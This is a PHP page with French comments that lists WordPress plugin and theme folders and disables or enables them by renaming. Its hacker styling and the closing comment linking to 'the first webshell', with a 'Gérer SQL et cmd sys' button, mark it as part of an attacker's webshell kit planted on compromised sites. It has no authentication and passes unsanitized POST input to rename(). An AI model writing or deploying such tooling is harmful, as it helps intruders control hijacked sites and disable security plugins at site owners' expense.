<?php
// Chemins vers les répertoires des plugins et thèmes WordPress
$plugins_path = './wp-content/plugins/';
$themes_path = './wp-content/themes/';

// Vérifier si un répertoire existe
function is_directory($path) {
    return is_dir($path);
}

// Lister les dossiers de plugins ou thèmes
function list_directories($path) {
    return array_filter(glob($path . '*'), 'is_dir');
}

// Désactiver (commenter) un plugin ou thème en ajoutant un préfixe '_'
function disable_directory($path, $dir_name) {
    $new_name = $path . '_' . $dir_name;
    if (rename($path . $dir_name, $new_name)) {
        echo "<div class='success'>$dir_name désactivé avec succès.</div>";
    } else {
        echo "<div class='error'>Erreur lors de la désactivation de $dir_name.</div>";
    }
}

// Activer (décommenter) un plugin ou thème en supprimant le préfixe '_'
function enable_directory($path, $dir_name) {
    $new_name = $path . ltrim($dir_name, '_');
    if (rename($path . $dir_name, $new_name)) {
        echo "<div class='success'>$dir_name activé avec succès.</div>";
    } else {
        echo "<div class='error'>Erreur lors de l'activation de $dir_name.</div>";
    }
}

// Désactiver ou activer les plugins/thèmes en fonction des actions soumises
if (isset($_POST['disable_plugin'])) {
    disable_directory($plugins_path, $_POST['plugin_name']);
}
if (isset($_POST['enable_plugin'])) {
    enable_directory($plugins_path, $_POST['plugin_name']);
}
if (isset($_POST['disable_theme'])) {
    disable_directory($themes_path, $_POST['theme_name']);
}
if (isset($_POST['enable_theme'])) {
    enable_directory($themes_path, $_POST['theme_name']);
}
?>

<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Gestion des Plugins et Thèmes WP</title>
    <style>
        body {
            background-color: #0d0d0d;
            color: #00ff00;
            font-family: monospace;
            text-align: center;
            padding: 20px;
        }
        h2, h3 {
            color: #00cc00;
        }
        input[type="submit"] {
            background-color: #00ff00;
            color: #000;
            padding: 10px 20px;
            border: none;
            cursor: pointer;
        }
        input[type="submit"]:hover {
            background-color: #00cc00;
        }
        table {
            width: 100%;
            margin-top: 20px;
            color: #00ff00;
            border-collapse: collapse;
        }
        th, td {
            border: 1px solid #00ff00;
            padding: 10px;
            text-align: left;
        }
        .error {
            color: red;
        }
        .success {
            color: #00ff00;
        }
        .button {
            background-color: blue;
            color: #ff0000;
            padding: 10px 20px;
            text-align: center;
            text-decoration: none;
            display: inline-block;
            font-size: 16px;
            margin: 20px;
            cursor: pointer;
            border: none;
            border-radius: 5px;
        }
        .button:hover {
            background-color: purple;
        }
    </style>
</head>
<body>
    <h2>Gestion des Plugins et Thèmes WordPress</h2>

    <h3>Liste des Plugins WordPress</h3>
    <table>
        <tr><th>Plugin</th><th>Action</th></tr>
        <?php
        // Lister les plugins
        $plugins = list_directories($plugins_path);
        foreach ($plugins as $plugin) {
            $plugin_name = basename($plugin);
            echo "<tr>
                    <td>{$plugin_name}</td>
                    <td>
                        <form method='POST' style='display:inline-block'>
                            <input type='hidden' name='plugin_name' value='{$plugin_name}'>
                            ".(strpos($plugin_name, '_') === 0
                                ? "<input type='submit' name='enable_plugin' value='Activer'>"
                                : "<input type='submit' name='disable_plugin' value='Désactiver'>"
                            )."
                        </form>
                    </td>
                  </tr>";
        }
        ?>
    </table>

    <h3>Liste des Thèmes WordPress</h3>
    <table>
        <tr><th>Thème</th><th>Action</th></tr>
        <?php
        // Lister les thèmes
        $themes = list_directories($themes_path);
        foreach ($themes as $theme) {
            $theme_name = basename($theme);
            echo "<tr>
                    <td>{$theme_name}</td>
                    <td>
                        <form method='POST' style='display:inline-block'>
                            <input type='hidden' name='theme_name' value='{$theme_name}'>
                            ".(strpos($theme_name, '_') === 0
                                ? "<input type='submit' name='enable_theme' value='Activer'>"
                                : "<input type='submit' name='disable_theme' value='Désactiver'>"
                            )."
                        </form>
                    </td>
                  </tr>";
        }
        ?>
    </table>

    <!-- Lien vers le premier webshell -->
    <form action="/" method="get">
        <button type="submit" class="button">Gérer SQL et cmd sys</button>
    </form>

</body>
</html>
